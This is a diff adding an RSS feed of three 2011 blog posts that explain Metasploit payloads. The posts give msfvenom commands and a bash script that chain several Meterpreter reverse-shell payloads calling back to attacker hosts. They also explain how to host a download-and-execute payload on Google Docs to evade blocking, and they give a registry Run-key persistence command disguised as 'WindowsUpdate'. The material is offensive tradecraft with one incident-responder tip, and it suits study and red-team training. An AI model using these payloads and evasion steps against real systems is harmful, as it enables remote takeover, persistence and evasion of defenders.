@@ -1,0 +1,177 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Payloads on Room362</title>
+    <link>http://room362.com/categories/payloads/</link>
+    <description>Recent content in Payloads on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Sun, 17 Jul 2011 07:49:34 +0000</lastBuildDate>
+    <atom:link href="http://room362.com/categories/payloads/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Metasploit Payloads Explained - Part 1b</title>
+      <link>http://room362.com/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/</link>
+      <pubDate>Sun, 17 Jul 2011 07:49:34 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/</guid>
+      <description>&lt;p&gt;This series was interrupted a bit by the new Metasploit HTTP/HTTPS payloads (&lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication&#34;&gt;more info&lt;/a&gt;). Definitely not complaining though as the new features *(as will be discussed in part 2) are some epic new additions to the payloads list. However an important change happened while the craziness over the new payloads was going on. ScriptJunkie snuck in an awesome change to msfvenom (a.k.a. msffsm).&lt;/p&gt;
+
+&lt;p&gt;Here is the link to the ticket about the change (&lt;a href=&#34;https://dev.metasploit.com/redmine/issues/4714&#34;&gt;link&lt;/a&gt;) and the revision (&lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13057&#34;&gt;r13057&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;TL;DR version&lt;/strong&gt;: This change allows you to put multiple payloads into one binary&amp;hellip; ya.. awesomesauce.&lt;/p&gt;
+
+&lt;p&gt;He gives the following example:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ruby msfvenom -p windows/messagebox -f raw EXITFUNC=thread &amp;gt; /tmp/msgbox.raw
+ruby msfvenom -p windows/meterpreter/reverse_tcp -f raw -t /tmp/msgbox.raw -k LHOST=192.168.0.102 EXITFUNC=thread &amp;gt; /tmp/rev102msgbox.raw
+ruby msfvenom -p - -f exe &amp;lt; /tmp/rev102msgbox.raw &amp;gt; /tmp/rev102msgbox.exe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This example when &amp;lsquo;rev102msgbox.exe&amp;rsquo; is run will pop up a message box with the default options (Hello, from MSF!) and throw a reverse)tcp connection to 192.168.0.102 over the default port of 4444.&lt;/p&gt;
+
+&lt;p&gt;This is great as an example and a good way to test to see if things are working, but I don&amp;rsquo;t normally like to inform my victims that I&amp;rsquo;m there by saying hello (especially if I&amp;rsquo;m not there to see their faces).&lt;/p&gt;
+
+&lt;p&gt;So I thought that this would be a great way of throwing a bunch of payloads together to try a few of the tried and true ways of getting past restrictive networks all in one binary. I started off with 3 payloads:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;reverse_tcp_dns to port 7815&lt;/li&gt;
+&lt;li&gt;reverse_tcp_dns to port 80&lt;/li&gt;
+&lt;li&gt;reverse_https to port 443&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I chose those because I can change the DNS to point to a new IP address in future without having to regenerate my binary and size really isn&amp;rsquo;t a concern since I won&amp;rsquo;t be using it in an exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;(&lt;strong&gt;SIDE NOT&lt;/strong&gt;E: The motive for the port 7815 one is because sometimes there are proxy settings for port 80 and 443 &lt;em&gt;which the new HTTP/HTTPS payloads can handle (&amp;lsquo;cept for Auth proxies)&lt;/em&gt; but for some reason quite regularly companies will still allow odd ports to fly through unencumbered)&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is what I did:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;./msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=badguy.attacker.com LPORT=443 &amp;gt; /tmp/stage1.raw
+./msfvenom -p windows/meterpreter/reverse_tcp_dns -f raw LHOST=badguy.attacker.com LPORT=80 -c /tmp/stage1.raw &amp;gt; /tmp/stage2.raw
+./msfvenom -p windows/meterpreter/reverse_tcp_dns -f exe LHOST=badguy2.attacker.com LPORT=7815 -c /tmp/stage2.raw &amp;gt; /tmp/stage3.exe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Luckily (and you&amp;rsquo;ll see why in a second) I forgot to set up a multi/handler on port 7815, which caused me to notice an issue. When one of the payloads failed to connect, &amp;lsquo;&lt;strong&gt;ExitProcess&lt;/strong&gt;&amp;rsquo; was called, causing all of my payloads to die prematurely (even if they had already gotten the second stage).&lt;/p&gt;
+
+&lt;p&gt;I tried setting &lt;strong&gt;AutoRunScript&lt;/strong&gt; to &amp;lsquo;migrate -f&amp;rsquo; so that the payloads would migrate out into a new Notepad process. But the connection died too quickly and none of the payloads were fast enough at jumping ship.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;ReverseConnectRetries&lt;/strong&gt; to the rescue. This is an advanced setting for the reverse_tcp family (ipv6_tcp, nonx_tcp, ord_tcp, tcp, tcp_allports, tcp_dns) which tells the payload how many times to loop through the initial connection. This setting defaults to 5 but can be anything between 1 and 255. The 255 setting is special since it actually sets an infinite loop. Sweet, now our sinking should never call the ExitProcess command right? Not quite, reverse_https and reverse_http doesn&amp;rsquo;t have this setting. We are still in a bit of a race condition if we want to use those payloads but it is a race we can win now at least.&lt;/p&gt;
+
+&lt;p&gt;I wrote a very simple batch file to generate my new binary when I need it (also so I don&amp;rsquo;t have to remember all the commands):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+
+echo Building Stage 1
+./msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=badguy.attacker.com LPORT=443 &amp;gt; /tmp/stage1.raw
+
+echo Building Stage 2
+./msfvenom -p windows/meterpreter/reverse_tcp_dns -f raw LHOST=badguy.attacker.com ReverseConnectRetries=255 LPORT=80 -c /tmp/stage1.raw &amp;gt; /tmp/stage2.raw
+
+echo Building Stage 3
+./msfvenom -p windows/meterpreter/reverse_tcp_dns -f exe LHOST=badguy2.attacker.com ReverseConnectRetries=255 LPORT=7815 -c /tmp/stage2.raw &amp;gt; /tmp/stage3.exe
+
+echo Cleaning up...
+rm -rf /tmp/stage1.raw /tmp/stage2.raw
+
+echo Done..
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Plus it tells you whats going on and does a bit of clean up, leaving you with just your hydra-binary. One of the things I thought about adding was the cmd/windows/adduser payload just so if the user is an admin we can start our day off without having to add ourselves a user but I decided against it just for clean up and &amp;ldquo;noise&amp;rdquo; purposes.&lt;/p&gt;
+
+&lt;p&gt;(You&amp;rsquo;ll also notice that one of the payloads is going somewhere else.. no reason to not give your payloads every chance of getting out) Sharing is caring right?&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Payloads Explained - Part 1a</title>
+      <link>http://room362.com/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/</link>
+      <pubDate>Sun, 26 Jun 2011 17:47:23 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/</guid>
+      <description>&lt;p&gt;In Part 1 I gave an example I used at CCDC with the single &amp;lsquo;windows/download_exec&amp;rsquo;. One of the down sides of that payload is you need to host the binary, giving up an IP/host that can be blocked. Well, Google recently (a couple months ago) allowed people to upload &amp;lsquo;anything&amp;rsquo; to Google docs. And you can then share these files publicly. Probably already see where I&amp;rsquo;m going with this, but here are some steps to get it going, first upload your malicious binary (not the dropper &amp;lsquo;windows/download_exec&amp;rsquo;, but the file it needs to execute). I assume you don&amp;rsquo;t need a picture to find the upload button ;-)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201106_payloads1a_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, go to Action -&amp;gt; Share -&amp;gt; Share and make it public:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201106_payloads1a_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You&amp;rsquo;ll get a link that says docs.google.com / leaf?id= something:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201106_payloads1a_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Go to that link and copy the link that says &amp;lsquo;Download&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;You should have something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://docs.google.com/uc?id=XXXXXXXX&amp;amp;export=download&amp;amp;hl=en_US&#34;&gt;https://docs.google.com/uc?id=XXXXXXXX&amp;amp;export=download&amp;amp;hl=en_US&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Remove everything after the &amp;amp; and change https to http (download_exec can&amp;rsquo;t talk SSL) so you have something that looks like:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://docs.google.com/uc?id=XXXXXXXX&#34;&gt;http://docs.google.com/uc?id=XXXXXXXX&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Now use that link in the URL option when you generate your &amp;lsquo;windows/download_exec&amp;rsquo; binary and you should be good to go. You can still change your binary on the fly by right clicking the file in your Google Docs list and selecting &amp;ldquo;Add or manage revisions&amp;rdquo;. Plus you get the added bonus of being virtually unblockable.&lt;/p&gt;
+
+&lt;p&gt;One thing to be careful of is the download a &amp;lsquo;leaf&amp;rsquo; link are still live if you put the files in the &amp;lsquo;trash&amp;rsquo; on Google Docs, you need to empty the trash for them to be completely offline.&lt;/p&gt;
+
+&lt;p&gt;Incident Responders, if you find something making these requests, switch the UC portion of the download back to &amp;lsquo;leaf&amp;rsquo; and you can find out when it was uploaded, and have the ability to &amp;ldquo;Report Abusive Content&amp;rdquo; which if that account continues to do &amp;lsquo;bad stuff&amp;rsquo; it will get looked into by Google.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Payloads Explained - Part 1</title>
+      <link>http://room362.com/post/2011/2011-06-26-metasploit-payloads-explained-part-1/</link>
+      <pubDate>Sun, 26 Jun 2011 15:00:00 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2011/2011-06-26-metasploit-payloads-explained-part-1/</guid>
+      <description>&lt;p&gt;Payload selection is something that rarely gets talked about in detail. Most PoCs just use calc.exe, netcat, or some kind of socket. The vast majority of Metasploit tutorials, videos and documentation use the _&lt;strong&gt;windows/meterpreter/reverse_tcp&lt;/strong&gt;_ payload which is only one of 224 possible payloads. Here is a little disclaimer: While the payloads in Metasploit don&amp;rsquo;t get updated as much as other parts of Metasploit, this is a point in time documentation of them (June 23, 2011) and the payloads available in Metasploit are constantly changing. I challenge you to continue to do a &amp;lsquo;show payloads&amp;rsquo; and see what&amp;rsquo;s new.&lt;/p&gt;
+
+&lt;p&gt;If you issue &amp;lsquo;show payloads&amp;rsquo; at the base of Metasploit&amp;rsquo;s console (msf&amp;gt;), it will show you every payload that Metasploit has available. However, exploit module writers can help the user out a bit with their selection by putting special limiters inside of their module. These limiters can be as specific as pointing out a specific payload, or as broad as specifying that it will only work with a &amp;lsquo;windows&amp;rsquo; payload. For a decent example of this in action check out the JBoss &amp;lsquo;bshdeployer&amp;rsquo; exploit module (&lt;strong&gt;modules/exploits/multi/http/jboss_bshdeployer.rb&lt;/strong&gt;).&lt;/p&gt;
+
+&lt;p&gt;The payloads Metasploit has are broken down into &amp;lsquo;&lt;strong&gt;staged&lt;/strong&gt;&amp;rsquo;, &amp;lsquo;&lt;strong&gt;stagers&lt;/strong&gt;&amp;rsquo;, and &amp;lsquo;**singles &lt;strong&gt;(also known as Inline)&amp;lsquo;. The difference between &amp;lsquo;&lt;/strong&gt;staged&lt;strong&gt;&amp;rsquo; and &amp;lsquo;&lt;/strong&gt;stagers&lt;strong&gt;&amp;rsquo; is pretty simple, &amp;lsquo;&lt;/strong&gt;staged&lt;strong&gt;&amp;rsquo; payloads use tiny &amp;lsquo;&lt;/strong&gt;stagers&lt;strong&gt;&amp;rsquo; to be able to fit into small exploitation spaces. During exploitation the exploit developer often has a very limited amount of memory they can manipulate through the programs inputs that they are exploiting. The stagers go in this space and their only job is to pull down the rest of the &amp;lsquo;&lt;/strong&gt;staged&lt;strong&gt;&amp;rsquo; payload. The downside to these types of payloads is they require a connection to something that will shovel them the rest of the payload. Inline payloads or &amp;lsquo;&lt;/strong&gt;singles**&amp;rsquo; don&amp;rsquo;t have this problem. They are self contained and do what they are designed to do without any assistance.&lt;/p&gt;
+
+&lt;p&gt;All of the payloads in Metasploit use the one, the only, Multi Handler. I call it that because of how I call it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf&amp;gt; use multi/handler
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It is a fitting title though as it is equipped to handle every single payload inside of Metasploit no matter what the architecture or type of connection being made. It knows how to deal with each type of payload because you tell it what to expect, but that doesn&amp;rsquo;t take away from the fact that in this single utility lies the crucial stepping stone for all of Metasploit&amp;rsquo;s exploitation.&lt;/p&gt;
+
+&lt;p&gt;The structure of most payloads tell you exactly what they do, but not always. If it says in the description that it&amp;rsquo;s &amp;lsquo;&lt;strong&gt;Inline&lt;/strong&gt;&amp;rsquo; that means it is a single, if it says &amp;lsquo;&lt;strong&gt;Stager&lt;/strong&gt;&amp;rsquo; that means it&amp;rsquo;s staged. Lets break a few down of the lesser known ones:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;cmd/windows/adduser&lt;/code&gt; - This is a single that executes &amp;lsquo;net user /add&amp;rsquo; with the username and password you specify. This one doesn&amp;rsquo;t say that it&amp;rsquo;s &amp;lsquo;Inline&amp;rsquo; but all of the &amp;lsquo;cmd/&lt;em&gt;&amp;rsquo; or &amp;lsquo;&lt;/em&gt;/exec&amp;rsquo; payloads are singles.&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;osx/armle/vibrate&lt;/code&gt; - A single that when executed on an iPhone, it vibrates.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;generic/debug_trap&lt;/code&gt; - Trips a debugger if it&amp;rsquo;s attached to the process (sends a single xCC &amp;lsquo;break&amp;rsquo; byte)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;One thing that isn&amp;rsquo;t immediately obvious is another marker of staged vs. singles:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;osx/ppc/shell/reverse_tcp
+osx/ppc/shell_reverse_tcp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The difference between these two payloads isn&amp;rsquo;t obvious other than the fact that one has an underscore &amp;lsquo;_&amp;rsquo; instead of a forward slash &amp;lsquo;/&amp;rsquo;. The one with the underscore means it&amp;rsquo;s a single while the other is staged. But the architecture of the naming convention is a bit complicated. Most stick to OS/ARCHITECTURE/TYPE/PAYLOAD where a slash instead of an underscore between TYPE and PAYLOAD would signify the difference we just talked about. But not all payloads stick to this format. You can even go crazy and actually look in the directory: msfdirectory/modules/payloads/ - everything in the singles directory.. hmmm yup, is a single.&lt;/p&gt;
+
+&lt;p&gt;Singles are great for fire and forget, I&amp;rsquo;ve used as payloads for USB sticks (so the machine didn&amp;rsquo;t have to have a connection to do what I needed) all the way to a pretty sneaky persistence method. One that I used quite often at CCDC was with the payload: &amp;lsquo;&lt;strong&gt;windows/download_exec&lt;/strong&gt;&amp;rsquo;. The only option this single has is &amp;lsquo;URL&amp;rsquo;. We would put something like &lt;a href=&#34;http://www.redteam.com/evil.exe&#34;&gt;http://www.redteam.com/evil.exe&lt;/a&gt; and generate the binary:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201106_payloads_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(Yes you can use msfpayload, or msfvenom on the command line to generate payloads, but I like to stay inside of msfconsole)&lt;/p&gt;
+
+&lt;p&gt;Then set that to auto start when someone logs in with something like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; reg setval -k &amp;quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&amp;quot; -v &amp;quot;WindowsUpdate&amp;quot; -d &amp;quot;C:\Windows\dropper.exe&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now all we had to do is wait for logins. If they happened to find our evil.exe binary (which download_exec makes it &amp;lsquo;a.exe&amp;rsquo; and puts it in System32), and blocked our IP, all we had to do in replace evil.exe on our web server and wait for it to download the new one. A crude form of persistence, but it worked well.&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;m going to end this with a list of all the payloads&amp;hellip; hopefully for all you tab completion lazy bums this might be the first time you&amp;rsquo;ve actually have taken a second to look around. In the next post I&amp;rsquo;ll be going into Meterpreter, the BEST payload in my humble-totally-unbiased opinion ;), with a bit of pivoting thrown in for good measure.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201106_payloads_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
